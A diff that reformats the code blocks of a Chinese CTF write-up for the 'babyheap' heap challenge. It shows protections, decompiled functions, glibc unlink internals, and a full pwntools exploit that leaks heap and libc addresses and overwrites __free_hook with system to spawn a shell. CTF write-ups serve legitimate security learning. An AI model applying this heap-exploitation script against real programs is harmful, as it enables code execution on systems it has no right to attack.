@@ -16,12 +16,12 @@ tags:
 1，检查保护
 
 ```python
-	[*] '/home/chris/Pwn/babyheap'
-	    Arch:     amd64-64-little
-	    RELRO:    Full RELRO
-	    Stack:    Canary found
-	    NX:       NX enabled
-	    PIE:      No PIE (0x400000)
+[*] '/home/chris/Pwn/babyheap'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
 ```
 
 除了PIE，其他的全开。
@@ -30,54 +30,54 @@ tags:
 
 #### main 函数分析
 
-```python
-	void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
-	{
-	  char *v3; // rdi
-	  int v4; // [rsp+Ch] [rbp-24h]
-	  char s; // [rsp+10h] [rbp-20h]
-	  unsigned __int64 v6; // [rsp+28h] [rbp-8h]
-	
-	  v6 = __readfsqword(0x28u);
-	  sub_400882(a1, a2, a3);
-	  puts("I thought this is really baby.What about u?");
-	  puts("Loading.....");
-	  v3 = (char *)5;
-	  sleep(5u);
-	  while ( 1 )
-	  {
-	    while ( 1 )
-	    {
-	      while ( 1 )
-	      {
-	        sub_4008E3(v3);
-	        memset(&s, 0, 0x10uLL);
-	        read(0, &s, 0xFuLL);
-	        v3 = &s;
-	        v4 = atoi(&s);
-	        if ( v4 != 2 )
-	          break;
-	        sub_400A79(&s, &s);
-	      }
-	      if ( v4 > 2 )
-	        break;
-	      if ( v4 != 1 )
-	        goto LABEL_13;
-	      sub_4009A0(&s, &s);
-	    }
-	    if ( v4 == 3 )
-	    {
-	      sub_400C01(&s, &s);
-	    }
-	    else
-	    {
-	      if ( v4 != 4 )
-	LABEL_13:
-	        exit(0);
-	      sub_400B54(&s, &s);
-	    }
-	  }
-	}
+```c
+void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
+{
+  char *v3; // rdi
+  int v4; // [rsp+Ch] [rbp-24h]
+  char s; // [rsp+10h] [rbp-20h]
+  unsigned __int64 v6; // [rsp+28h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  sub_400882(a1, a2, a3);
+  puts("I thought this is really baby.What about u?");
+  puts("Loading.....");
+  v3 = (char *)5;
+  sleep(5u);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        sub_4008E3(v3);
+        memset(&s, 0, 0x10uLL);
+        read(0, &s, 0xFuLL);
+        v3 = &s;
+        v4 = atoi(&s);
+        if ( v4 != 2 )
+          break;
+        sub_400A79(&s, &s);
+      }
+      if ( v4 > 2 )
+        break;
+      if ( v4 != 1 )
+        goto LABEL_13;
+      sub_4009A0(&s, &s);
+    }
+    if ( v4 == 3 )
+    {
+      sub_400C01(&s, &s);
+    }
+    else
+    {
+      if ( v4 != 4 )
+LABEL_13:
+        exit(0);
+      sub_400B54(&s, &s);
+    }
+  }
+}
 ```
 
 读入你输入的选项，然后执行对应的函数，有5个选项：
@@ -104,28 +104,27 @@ malloc次数最多10次，每次大小只能为 0x20（fastbin），所以常规
 
 每次edit会使dword_6020B0值+1.当dword_6020B0值为3时，不能进行edit。作用是限制只能进行三次edit,且edit的大小0x20，观察sub_40092b函数
 
-```python
+```c
+unsigned __int64 __fastcall sub_40092B(__int64 a1, unsigned int a2)
+{
+  unsigned __int64 result; // rax
+  unsigned int i; // [rsp+1Ch] [rbp-4h]
 
-	unsigned __int64 __fastcall sub_40092B(__int64 a1, unsigned int a2)
-	{
-	  unsigned __int64 result; // rax
-	  unsigned int i; // [rsp+1Ch] [rbp-4h]
-	
-	  for ( i = 0; ; ++i )
-	  {
-	    result = i;
-	    if ( i >= a2 )
-	      break;
-	    read(0, (void *)(i + a1), 1uLL);
-	    if ( *(_BYTE *)(i + a1) == 10 || i == a2 - 1 )
-	    {
-	      result = i + a1;
-	      *(_BYTE *)result = 0;
-	      return result;
-	    }
-	  }
-	  return result;
-	}
+  for ( i = 0; ; ++i )
+  {
+    result = i;
+    if ( i >= a2 )
+      break;
+    read(0, (void *)(i + a1), 1uLL);
+    if ( *(_BYTE *)(i + a1) == 10 || i == a2 - 1 )
+    {
+      result = i + a1;
+      *(_BYTE *)result = 0;
+      return result;
+    }
+  }
+  return result;
+}
 
 ```
 
@@ -186,25 +185,25 @@ chunk 错了一下位 这是重中之重 unlink向前合并利用的关键
 
 首先检测next chunk是否为free。那么如何检测呢？很简单，查询next chunk之后的chunk的 PREV_INUSE (P)即可。相关代码如下：
 
-```python
-	……
-	/*这里p指向当前chunk*/
-	nextchunk = chunk_at_offset(p, size);
-	……
-	nextsize = chunksize(nextchunk);
-	……
-	if (nextchunk != av->top) { 
-	      /* get and clear inuse bit */
-	      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);  #判断nextchunk是否为free chunk
-	      /* consolidate forward */
-	      if (!nextinuse) {   #next chunk为free chunk
-	            unlink(nextchunk, bck, fwd);   #将nextchunk从链表中移除
-	          size += nextsize;   #p还是指向当前chunk只是当前chunk的size扩大了，这就是向前合并！
-	      } else
-	            clear_inuse_bit_at_offset(nextchunk, 0);    
-	
-	      ……
-	    }
+```c
+……
+/*这里p指向当前chunk*/
+nextchunk = chunk_at_offset(p, size);
+……
+nextsize = chunksize(nextchunk);
+……
+if (nextchunk != av->top) { 
+      /* get and clear inuse bit */
+      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);  #判断nextchunk是否为free chunk
+      /* consolidate forward */
+      if (!nextinuse) {   #next chunk为free chunk
+            unlink(nextchunk, bck, fwd);   #将nextchunk从链表中移除
+          size += nextsize;   #p还是指向当前chunk只是当前chunk的size扩大了，这就是向前合并！
+      } else
+            clear_inuse_bit_at_offset(nextchunk, 0);    
+
+      ……
+    }
 ```
 
 整个操作与”向后合并“操作类似，再通过上述代码结合注释应该很容易理解free chunk的向前结合操作。在本例中当前chunk为first，它的下一个chunk为second，再下一个chunk为top chunk，此时 top chunk的 `PREV_INUSE`位是设置为1的(表示top chunk的前一个chunk，即second chunk, 已经使用)，因此first的下一个chunk不会被“向前合并“掉。
@@ -232,81 +231,81 @@ bingo 最后就很简单了，分配一个新chunk 内容为 '/bin/sh\x00',并fr
 ## 0x02 完整脚本
 
 ```python
-	from pwn import *
-	context(os='linux', arch='amd64', log_level='debug')
-	p=process("./babyheap")
-	elf=ELF("/lib/x86_64-linux-gnu/libc-2.19.so")
-	
-	__free_hook = 0x3c4a10
-	system = 0x46590
-	
-	def g():
-	    gdb.attach(p)
-	    raw_input()
-	
-	def Add(index, data):
-	    p.recvuntil('Choice:')
-	    p.sendline('1')
-	    p.recvuntil('Index:')
-	    p.sendline(str(index))
-	    p.recvuntil('Content:')
-	    p.send(data)
-	
-	def Edit(index, data):
-	    p.recvuntil('Choice:')
-	    p.sendline('2')
-	    p.recvuntil('Index:')
-	    p.sendline(str(index))
-	    p.recvuntil('Content:')
-	    p.send(data)
-	
-	def Show(index):
-	    p.recvuntil('Choice:')
-	    p.sendline('3')
-	    p.recvuntil('Index:')
-	    p.sendline(str(index))
-	
-	def Delete(index):
-	    p.recvuntil('Choice:')
-	    p.sendline('4')
-	    p.recvuntil('Index:')
-	    p.sendline(str(index))
-	
-	
-	
-	Add(0,'AAAAAAAA\n')
-	Add(1,'BBBBBBBB\n')
-	
-	Delete(1)
-	Delete(0)
-	
-	Show(0)
-	heap_addr = u64(p.recvline()[ : -1].ljust(8, '\x00')) - 0x30
-	
-	Edit(0, p64(heap_addr + 0x20) + p64(0) + p64(0) + p64(0x31))
-	
-	Add(6, "aaa" + '\n')
-	Add(7, p64(0) + p64(0xa1) + '\n')
-	
-	Add(2,'CCCCCCCC\n')
-	Add(3,'DDDDDDDD\n')
-	
-	Add(4, p64(0) + p64(0x31) + p64(0x602080 - 0x18) + p64(0x602080 - 0x10))
-	Add(5, p64(0x30) + p64(0x30) + '\n')
-	
-	
-	Delete(1)
-	Show(1)
-	libc_address = u64(p.recvline()[ : -1].ljust(8, '\x00'))-0x3c27b8
-	
-	
-	Edit(4,p64(libc_address + __free_hook) + '\n')
-	Edit(1, p64(libc_address + system)+ '\n')
-	
-	Add(8,"/bin/sh\x00"+'\n')
-	Delete(8)
-	
-	p.interactive()
+from pwn import *
+context(os='linux', arch='amd64', log_level='debug')
+p=process("./babyheap")
+elf=ELF("/lib/x86_64-linux-gnu/libc-2.19.so")
+
+__free_hook = 0x3c4a10
+system = 0x46590
+
+def g():
+    gdb.attach(p)
+    raw_input()
+
+def Add(index, data):
+    p.recvuntil('Choice:')
+    p.sendline('1')
+    p.recvuntil('Index:')
+    p.sendline(str(index))
+    p.recvuntil('Content:')
+    p.send(data)
+
+def Edit(index, data):
+    p.recvuntil('Choice:')
+    p.sendline('2')
+    p.recvuntil('Index:')
+    p.sendline(str(index))
+    p.recvuntil('Content:')
+    p.send(data)
+
+def Show(index):
+    p.recvuntil('Choice:')
+    p.sendline('3')
+    p.recvuntil('Index:')
+    p.sendline(str(index))
+
+def Delete(index):
+    p.recvuntil('Choice:')
+    p.sendline('4')
+    p.recvuntil('Index:')
+    p.sendline(str(index))
+
+
+
+Add(0,'AAAAAAAA\n')
+Add(1,'BBBBBBBB\n')
+
+Delete(1)
+Delete(0)
+
+Show(0)
+heap_addr = u64(p.recvline()[ : -1].ljust(8, '\x00')) - 0x30
+
+Edit(0, p64(heap_addr + 0x20) + p64(0) + p64(0) + p64(0x31))
+
+Add(6, "aaa" + '\n')
+Add(7, p64(0) + p64(0xa1) + '\n')
+
+Add(2,'CCCCCCCC\n')
+Add(3,'DDDDDDDD\n')
+
+Add(4, p64(0) + p64(0x31) + p64(0x602080 - 0x18) + p64(0x602080 - 0x10))
+Add(5, p64(0x30) + p64(0x30) + '\n')
+
+
+Delete(1)
+Show(1)
+libc_address = u64(p.recvline()[ : -1].ljust(8, '\x00'))-0x3c27b8
+
+
+Edit(4,p64(libc_address + __free_hook) + '\n')
+Edit(1, p64(libc_address + system)+ '\n')
+
+Add(8,"/bin/sh\x00"+'\n')
+Delete(8)
+
+p.interactive()
 ```
 
 ## 0x03 总结
